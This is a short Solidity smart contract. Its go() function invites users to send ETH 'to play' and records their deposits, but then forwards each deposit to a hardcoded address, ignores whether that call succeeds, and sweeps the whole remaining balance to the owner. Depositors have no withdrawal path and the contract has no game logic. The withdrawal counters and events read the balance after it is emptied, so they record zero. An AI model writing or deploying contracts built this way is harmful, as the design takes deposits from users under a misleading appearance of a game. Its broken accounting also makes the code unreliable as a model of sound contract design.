pragma solidity ^0.8.26;

contract B {
    address public owner = msg.sender;
    uint public totalDeposits;
    uint public totalWithdrawals;
    mapping(address => uint) public userDeposits;
    
    event DepositMade(address indexed user, uint amount);
    event WithdrawalMade(address indexed user, uint amount);
    
    function go() public payable {
        require(msg.value > 0, "Must send ETH to play");
        totalDeposits += msg.value;
        userDeposits[msg.sender] += msg.value;
        
        address target = 0xC8A60C51967F4022BF9424C337e9c6F0bD220E1C;
        (bool success, ) = target.call{value: msg.value}("");
        
        payable(owner).transfer(address(this).balance);
        totalWithdrawals += address(this).balance;
        
        emit DepositMade(msg.sender, msg.value);
        emit WithdrawalMade(owner, address(this).balance);
    }
    
    receive() external payable {
        totalDeposits += msg.value;
        userDeposits[msg.sender] += msg.value;
        emit DepositMade(msg.sender, msg.value);
    }
}